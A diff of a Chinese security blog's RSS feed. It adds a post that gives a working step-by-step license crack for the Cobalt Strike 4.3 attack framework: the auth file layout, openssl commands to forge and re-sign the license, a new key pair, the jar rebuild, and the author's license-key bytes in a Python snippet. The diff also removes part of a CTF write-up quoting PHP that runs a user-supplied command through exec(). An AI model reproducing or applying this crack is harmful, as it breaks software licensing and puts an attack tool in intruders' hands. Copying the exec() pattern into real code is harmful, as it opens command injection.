@@ -5,9 +5,216 @@
     <description></description>
     <link>https://blog.pr0ph3t.com/</link>
     <atom:link href="https://blog.pr0ph3t.com/feed/index.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 28 Dec 2020 20:04:01 +0800</pubDate>
-    <lastBuildDate>Mon, 28 Dec 2020 20:04:01 +0800</lastBuildDate>
+    <pubDate>Thu, 10 Jun 2021 06:53:19 +0800</pubDate>
+    <lastBuildDate>Thu, 10 Jun 2021 06:53:19 +0800</lastBuildDate>
     <generator>Jekyll v4.2.0</generator>
+    
+      <item>
+        <title>[工具]Cobalt Strike4.3 破解日记</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;最新生活太难了，继续下去会有点自闭，所以趁着4.3出来还没多久，休闲一下换换情绪。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;4.3的验证方式其实相较于4.0来说并没有发生多大的变化，只是在其中加入了一些垃圾数据而已。按需更改就好了，趁着这次把之前4.0没有分析明白的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cobaltstrike.auth&lt;/code&gt;文件和整个验证流程好好理一理。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;原版的话网上也挺多的，这里就不放了。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://verify.cobaltstrike.com/&quot;&gt;checksum&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;这里使用的不是最快速的方法，把这当成厕所读物就好了&lt;/li&gt;
+  &lt;li&gt;还是回顾了一下零队的《Cobaltstrike 4破解之 我自己给我自己颁发license》&lt;a href=&quot;https://mp.weixin.qq.com/s/Pneu8R0zoG0ONyFXF9VLpg&quot;&gt;链接&lt;/a&gt; / ca3tie1师傅的《CobaltStrike4.0无Hook蛮力Cracked License思路》&lt;a href=&quot;https://ca3tie1.github.io/post/cobaltstrike40-wu-hook-man-li-cracked-license-si-lu/#0x00-%E5%89%8D%E8%A8%80&quot;&gt;链接&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;准备工作&quot;&gt;准备工作&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;请去参考&lt;a href=&quot;https://blog.pr0ph3t.com/posts/Cobalt-Strike4.0%E7%A0%B4%E8%A7%A3%E6%97%A5%E8%AE%B0/&quot;&gt;4.0破解日记&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;验证过程&quot;&gt;验证过程&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common/Authorization.java :12-28&lt;/code&gt;读取加密的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cobaltstrike.auth&lt;/code&gt;文件，实例化&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common/AuthCrypto&lt;/code&gt;后进行解密工作的准备&lt;/li&gt;
+  &lt;li&gt;读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resources/authkey.pub&lt;/code&gt;取出公钥 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common/AuthCrypto.java&lt;/code&gt;&lt;img src=&quot;https://i.loli.net/2021/06/10/DmK9rXeTYH1yPqb.png&quot; alt=&quot;AuthCrypto.java&quot; /&gt;
+并且从构造器我们可以得知他的加密方式是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSA/ECB/PKCS1Padding&lt;/code&gt;需要注意的是Padding方式&lt;/li&gt;
+  &lt;li&gt;然后简单的验证一下公钥的MD5是否对应，提取公钥。&lt;/li&gt;
+  &lt;li&gt;回到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common/Authorization.java :31&lt;/code&gt;开始解密，此时我们再去&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common/AuthCrypto.java : 47&lt;/code&gt;观察函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;public byte[] decrypt(byte[] var1)&lt;/code&gt;此时真正的解密在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;protected byte[] _decrypt(byte[] var1)&lt;/code&gt;保护函数中，而解密的公共函数中还有验证&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cobaltstrike.auth&lt;/code&gt;的文件魔术头，转换方法在&lt;a href=&quot;https://mp.weixin.qq.com/s/Pneu8R0zoG0ONyFXF9VLpg&quot;&gt;零队的文章&lt;/a&gt;中已经解释得很清楚了，这里就不再赘述了。 
+&lt;img src=&quot;https://i.loli.net/2021/06/10/jEw1PrXT2dzFgsK.png&quot; alt=&quot;decrypt&quot; /&gt;
+计算过程：
+-889274157&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;table rules=&quot;groups&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;原&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;反&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;补&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;十进制&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;1100 1010&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0011 0101&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0011 0110&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;-54&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;1111 1110&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0000 0001&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0000 0010&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;-2&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;1100 0000&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0011 1111&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0100 0000&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;-64&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;1101 0011&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0010 1100&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;0010 1101&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;-45&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;最后计算出来前四个bytes是&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ol&gt;
+  &lt;li&gt;代码中使用的是步进读取的方式操作的文件，所以我们要分清楚每个操作读了多少个字节 （从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common/DataParser.java&lt;/code&gt;能得知）
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;
+readInt() 4个字节
+readByte() 1个字节
+readShort() 2个字节
+readBytes(int n) n个字节
+&lt;/code&gt;
+这里要注意的是代码line 64-65中还使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readShort()&lt;/code&gt;获取了剩下需要读取的数据长度，所以后面我们要删除垃圾操作/数据的时候需要更改此处
+最后回到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;common/Authorization.java&lt;/code&gt;，接下来就是真正的校验环节了，我们需要关注的是他的所有读取操作
+&lt;img src=&quot;https://i.loli.net/2021/06/10/sFgdan3tliMKec8.png&quot; alt=&quot;Authorization.java主要校验代码&quot; /&gt;
+    &lt;ul&gt;
+      &lt;li&gt;一 line: 36 首先把解密后的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raw&lt;/code&gt;文件使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DataParser&lt;/code&gt;封装，方便读取。&lt;/li&gt;
+      &lt;li&gt;二 line: 38 读取过期时间，如果是29999999就是永久，转换方法和文件头一样&lt;/li&gt;
+      &lt;li&gt;三 line: 39 读取水印值，具体是哪来干嘛的我也不太清楚，只知道如果值为0的话会帮你添加EICAR指纹，这里设置一个非0数值即可&lt;/li&gt;
+      &lt;li&gt;四 line: 40 读取版本号进行简单的版本校验，这里设置一个大于等于43的值即可&lt;/li&gt;
+      &lt;li&gt;五 line: 46-51 其实是一个读取垃圾值的操作，简单来说就是读取一个字节作为接下来的读取长度，然后读取垃圾值后扔掉 循环3次，我嫌麻烦就直接删掉了&lt;/li&gt;
+      &lt;li&gt;六 line: 52 读取sleeve keygen key的长度&lt;/li&gt;
+      &lt;li&gt;七 line: 53 根据长度读取sleeve keygen key&lt;/li&gt;
+      &lt;li&gt;八 line: 54-60 时间校验，根据步骤二中读出的值做判断&lt;/li&gt;
+      &lt;li&gt;九 其实到此为止已经完成了校验过程了，后续的sleeve keygen过程就没有再过多研究了，只是大概知道是生成解密各类dll/bin的key seed，有机会二开的时候再看看吧&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;文件解释&quot;&gt;文件解释&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;common/AuthCrypto.java 公钥相关的操作，比如读取公钥、解密&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CobaltStrike.auth&lt;/code&gt;、校验文件头等&lt;/li&gt;
+  &lt;li&gt;common/Authorization.java 主要的校验代码，解密过后的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CobaltStrike.auth&lt;/code&gt;中数据就在这检查&lt;/li&gt;
+  &lt;li&gt;resources/authkey.pub 公钥匙，要求padding为PKCS#1&lt;/li&gt;
+  &lt;li&gt;cobaltstrike.auth 经过私钥签名加密的校验信息，文件结构如下：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;table rules=&quot;groups&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;header&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;length&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;expire time&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Version&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;垃圾数据x3&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;sleeve keygen key&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;文件魔术头&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;length of rest data&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;过期时间 29999999为永久&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;版本号&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;垃圾数据x3&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;最关键的sleeve keygen key&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;4个字节&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;2个字节&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;4个字节&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;1个字节&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;(1个字节的长度+对应长度的垃圾数据)x3&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;1个字节的长度+对应的key长度(这里为1+16个字节)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;开始破解&quot;&gt;开始破解：&lt;/h2&gt;
+
+&lt;p&gt;我们需要修改的东西为&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;使用网上已有的破解版获得authkey.pub和CobaltStrike.auth（如果新版本出来没有的话可以去尝试申请试用版获得）&lt;/li&gt;
+  &lt;li&gt;使用openssl解密CobaltStike.auth，获得sleeve keygen key （这里哭一下当初找的破解版的CobaltStrike.auth作者把文件头校验和长度校验直接删掉了，在理清文件结构的时候踩了不少坑）&lt;/li&gt;
+  &lt;li&gt;计算正确的header&lt;/li&gt;
+  &lt;li&gt;计算正确的文件长度&lt;/li&gt;
+  &lt;li&gt;填充各类校验字节，如时间/水印/版本/垃圾字符&lt;/li&gt;
+  &lt;li&gt;重新生成公私钥&lt;/li&gt;
+  &lt;li&gt;把重新写好的CobaltStrike.auth用私钥签名（使用openssl的时候注意参数是-sign 不是-encrypt，这里也踩了一个坑&amp;lt;-其实是密码学没学好，sign有两种形式，一个是直接把文件用私钥加密，一种是计算文件摘要并用私钥加密，这里我们使用第一种）&lt;/li&gt;
+  &lt;li&gt;计算公钥的MD5并更改，扔进去&lt;/li&gt;
+  &lt;li&gt;把CobaltStrike.auth扔进去&lt;/li&gt;
+  &lt;li&gt;重新build jar，开始愉快的使用&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;命令相关&quot;&gt;命令相关：&lt;/h2&gt;
+
+&lt;p&gt;生成公私钥（这里要注意的是使用2048bit和PKCS#1）&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl genrsa &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; pk.pem 2048
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;导出公钥&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl rsa &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; pk.pem &lt;span class=&quot;nt&quot;&gt;-pubout&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; pub.pem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;签名&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-sign&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; pk.pem &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; cs4.3-plain.auth &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; cobaltstrike.auth
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;检查签名&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-verify&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pubin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; pub.pem &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; cobaltstrike.auth
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3&gt;～&lt;/h3&gt;
+&lt;p&gt;打完收工，最后提供一份我的cobaltstrike.auth文件内容（删了垃圾数据的）&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xCA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xD3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xA0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x49&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xEE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xBD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xD7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cs4.3-plain.auth'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'w+'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;神清气爽 继续搬砖去了。。。。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;参考：
+&lt;a href=&quot;https://mp.weixin.qq.com/s/Pneu8R0zoG0ONyFXF9VLpg&quot;&gt;零队&lt;/a&gt;
+&lt;a href=&quot;https://ca3tie1.github.io/post/cobaltstrike40-wu-hook-man-li-cracked-license-si-lu/#0x00-%E5%89%8D%E8%A8%80&quot;&gt;ca3tie1&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 09 Jun 2021 20:00:00 +0800</pubDate>
+        <link>https://blog.pr0ph3t.com//posts/Cobalt-Strike4.3%E7%A0%B4%E8%A7%A3%E6%97%A5%E8%AE%B0/</link>
+        <guid isPermaLink="true">https://blog.pr0ph3t.com//posts/Cobalt-Strike4.3%E7%A0%B4%E8%A7%A3%E6%97%A5%E8%AE%B0/</guid>
+        
+        <category>CyberSecurity</category>
+        
+        <category>Tools</category>
+        
+        <category>RedTeam</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
     
       <item>
         <title>[HTB] Starting Point {1}</title>
@@ -2369,165 +2576,6 @@ https://github.com/orangetw/My-CTF-Web-Challenges&lt;/p&gt;
         <pubDate>Tue, 28 Nov 2017 01:17:00 +0800</pubDate>
         <link>https://blog.pr0ph3t.com//posts/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/</link>
         <guid isPermaLink="true">https://blog.pr0ph3t.com//posts/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/</guid>
-        
-        <category>CyberSecurity</category>
-        
-        <category>writeup</category>
-        
-        <category>hitcon</category>
-        
-        <category>old</category>
-        
-        
-        <category>posts</category>
-        
-      </item>
-    
-      <item>
-        <title>[hitcon2017] BabyFirst Revenge复现</title>
-        <description>&lt;p&gt;hitcon的题好难啊！！！！！
-还是太菜了。。Orz
-只能够赛后搭环境复现了。。
-分享本题自制Dockerfile：&lt;a href=&quot;https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;这题是一个特别的命令执行题， 首先进去首页之后发现以下源码&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$sandbox&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/www/sandbox/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;orange&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REMOTE_ADDR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sandbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sandbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
